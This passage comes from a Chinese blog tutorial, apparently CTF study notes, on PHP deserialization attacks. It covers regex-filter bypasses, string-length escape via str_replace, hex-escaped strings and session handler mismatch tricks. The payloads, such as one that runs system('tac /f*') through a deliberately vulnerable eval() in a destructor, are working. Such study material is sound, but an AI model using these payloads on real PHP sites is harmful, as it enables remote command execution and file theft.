class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YAje0</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));<br></code></pre></td></tr></table></figure><p>比较鸡肋，只能执行<code>construct()</code>和<code>destruct()</code>函数，无法添加任何内容</p><h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><h3 id="检测’O’"><a href="#检测’O’" class="headerlink" title="检测’O’"></a>检测’O’</h3><blockquote><p>利用条件：<br>preg_match(‘&#x2F;^O:\d+&#x2F;i’,$data)</p></blockquote><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/i&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;object not allow unserialize&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用方式1：当在代码中使用类似<code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>的正则语句来匹配是否是对象字符串开头的时候，可以使用<code>+</code>绕过</p><p><code>O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code><br><code>O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code></p><p>要注意在<code>url</code>里传参时<code>+</code>要编码为<code>%2B</code></p><p>利用方式2：使用<code>array()</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backdoor</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="检测’-’"><a href="#检测’-’" class="headerlink" title="检测’}’"></a>检测’}’</h3><p>有时候会遇到另一种正则，比如<code>/\&#125;$/</code>，会匹配最后一个<code>&#125;</code></p><p>反序列化字符串末尾的<code>&#125;&#125;&#125;&#125;</code>是可以全部删掉的，没有影响</p><p>比如<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;</code></p><p>变成<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;</code></p><p>甚至在末尾填充字符<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa</code></p><p>均能正常解析</p><h3 id="检测数字"><a href="#检测数字" class="headerlink" title="检测数字"></a>检测数字</h3><p>可以用字符<code>i</code>、<code>d</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h2><p>利用方式：当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使<code>$a</code>永远与<code>$b</code>相等</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$this-&gt;b = &amp;$this-&gt;a;</code>表示<code>$b</code>变量指向的地址永远指向<code>$a</code>变量指向的地址</p><h2 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h2><p>利用方式：当代码中存在关键词检测时，将表示字符类型的<code>s</code>改为大写来绕过检测</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果过滤了关键字<code>admin</code>，可以将其替换成<code>O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;</code></p><p>表示字符类型的s为大写时，就会被当成16进制解析</p><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于<code>php</code>在进行反序列化时，是从左到右读取，读取多少取决于<code>s</code>后面的字符长度，且认为读到<code>&#125;</code>就结束了，<code>&#125;</code>后面的字符不会有影响</p><p>一般触发字符逃逸的条件是替换函数<code>str_replace</code>，使字符串长度改变，造成字符逃逸，读取到不一样的数据</p><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以发现结果中的<code>aaa</code>被替换成了<code>aaaa</code>，但是长度值没变，还是<code>3</code>，这就导致多出了一个<code>a</code>，而且值是可控的，我们可以将这部分值变为 <code>很多aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;</code>， <code>很多aaa</code>的具体个数取决于后面想要构造的字符串的长度，这里是<code>21</code>位，就用<code>21</code>组<code>aaa</code>，这样替换后会多出<code>21</code>个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$b</code>的值成功被修改成了<code>qaq</code></p><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><p>原理与<code>过滤后字符变多</code>大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要注意闭合就行了，与sql注入类似</p><h2 id="类属性不敏感"><a href="#类属性不敏感" class="headerlink" title="类属性不敏感"></a>类属性不敏感</h2><p>对于<code>PHP</code>版本<code>7.1+</code>，对属性的类型不敏感</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$hello</span>=<span class="hljs-string">&quot;private&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;hello);<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//string(6) &quot;public&quot;</span><br></code></pre></td></tr></table></figure><p>令<code>public</code>时得到的序列化字符串，在<code>priviate</code>或者<code>protected</code>修饰的时候反序列化，<code>hello</code>属性都能获得值</p><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p>什么是session这里就不描述了，网上有很多文章可以参考</p><p>先了解下<code>PHP session</code>不同引擎的存储机制</p><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的</p><p>session.serialize_handler定义的引擎共有三种：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的数组</td></tr></tbody></table><p>当<code>php</code>和<code>php_serialize</code>这两个处理区混合起来使用，就会出现<code>session</code>反序列化漏洞。原因是<code>php_serialize</code>存储的反序列化字符可以引用<code>|</code>，如果这时候使用<code>php</code>处理器的格式取出<code>$_SESSION</code>的值，<code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞</p><h2 id="SESSION变量可控"><a href="#SESSION变量可控" class="headerlink" title="$_SESSION变量可控"></a>$_SESSION变量可控</h2><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><br><span class="hljs-comment">//2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先在<code>1.php</code>传入<code>?session=lewiserii</code></p><p><code>session</code>的内容，因为1.php页面用的是<code>php_serialize</code>引擎，所以是序列化处理的数组的形式</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-1.png"></p><p>而2.php用的是<code>php</code>引擎，在可控点传入<code>|</code>+<code>序列化字符串</code>，然后再次访问2.php调用session值的时候会触发</p><p>传入<code>?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;</code>后，文件中的值就变成了下图中的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-2.png"></p><p>再次访问2.php，发现成功反序列化，修改了<code>$name</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-3.png"></p><blockquote><p>总结：由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</p></blockquote><h2 id="SESSION变量不可控"><a href="#SESSION变量不可控" class="headerlink" title="$_SESSION变量不可控"></a>$_SESSION变量不可控</h2><p>当<code>$_SESSION</code>不能直接控制时，可以借助<code>PHP_SESSION_UPLOAD_PROGRESS</code>来完成反序列化</p><p>关于<code>PHP_SESSION_UPLOAD_PROGRESS</code>的介绍可以参考我的另一篇文章<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session.upload_progress文件包含</a></p><p>这里用ctfshow的一道新春题的前半部分作例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.serialize_handler&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$happy</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$happy</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 